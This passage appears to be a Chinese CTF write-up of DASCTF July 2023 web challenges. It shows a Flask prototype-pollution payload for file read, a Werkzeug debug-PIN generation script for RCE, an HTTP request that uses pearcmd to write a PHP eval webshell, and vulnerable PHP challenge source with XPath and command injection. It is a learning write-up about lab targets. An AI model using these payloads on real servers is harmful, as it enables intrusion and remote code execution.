<span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure><p>看到 <code>merge()</code> 的时候就很容易想到是原型链污染了</p><p><a class="link" href="https://tttang.com/archive/1876">https://tttang.com/archive/1876<i class="fas fa-external-link-alt"></i></a></p><p>污染 flask 的 <code>_static_folder</code> 为 <code>/</code> 就可以进行目录穿越了。</p><p>读取 secret.py 文件，发现其中的 blacklist 为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list = [<span class="string">b&#x27;__init__&#x27;</span>, <span class="string">b&#x27;jinja&#x27;</span>, <span class="string">b&#x27;black_list&#x27;</span>]</span><br></pre></td></tr></table></figure><p>构造部分 PoC</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__init\u005f_&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;_static_folder&quot;</span><span class="punctuation">:</span><span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这样子之后就可以进行任意文件读取了</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>能到读到 <code>proc/1/cmdline</code></p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/cmdline1.png" class><p>再去读 flag</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/flag1.png" class><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>队里有师傅做了预期解</p><p>这里的思路是通过污染 <code>__file__</code> 为 flag，从而达到访问 <code>/</code> 的时候就访问了 <code>/flag</code>，但是由于非预期解这里可以看到 flag 名并不是这一个，但是题目开了 debug，我们可以通过计算 debug pin 码 RCE</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/debugPin.png" class><p>读 <code>/proc/self/status</code> 的到 uid0，也就是用户为 root</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/statusRoot.png" class><p>生成 pin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">mac = <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&#x27;3e:a3:33:76:6f:cd&#x27;</span>.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>),<span class="number">16</span>))<span class="comment">#/sys/class/net/eth0/address</span></span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    mac, </span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c89620docker-c647c1a8da0d432cdf87af77e028edfdd0709e41b4c6244064e0b23fd60ea0ea.scope&#x27;</span> <span class="comment">#1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">]<span class="comment">#96cec10d3d9307792745ec3b85c89620 867ab5d2-4e57-4335-811b-2943c662e936 docker-c647c1a8da0d432cdf87af77e028edfdd0709e41b4c6244064e0b23fd60ea0ea.scope</span></span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">    </span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>Y4tacker 师傅的文章</p><p><a class="link" href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%89%8D%E5%8F%B0RCE">https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%89%8D%E5%8F%B0RCE<i class="fas fa-external-link-alt"></i></a></p><p>按照思路打是这个 payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?+config-create+/&amp;r=../../../../../../../../../../../../../../../www/server/php/52/lib/php/pearcmd&amp;/&lt;?=@eval($_GET[&#x27;shell&#x27;]);?&gt;+/tmp/hello.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>05c1eb98-7fcc-439c-be7c-3dade9e555df.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再去做文件包含，但是实际做的时候发现这样子无法写🐎，怀疑是路径问题，Y4tacker 师傅说到这个路径其实是宝塔的，那 Linux 下一般 php 的路径都是 <code>/usr/bin/php</code>，pearcmd 的路径经过查询才知道是 <code>usr/share/php</code>麻了，当时一直在尝试其他思路，还以为 pearcmd 被删了。</p><p>写马</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/writeEvilCode.png" class><p>连马</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/flag2.png" class><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p>搞源码，先在登录框输入 <code>123&#39;/123</code>，会能够在注释中看到源码</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/source3.png" class><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span 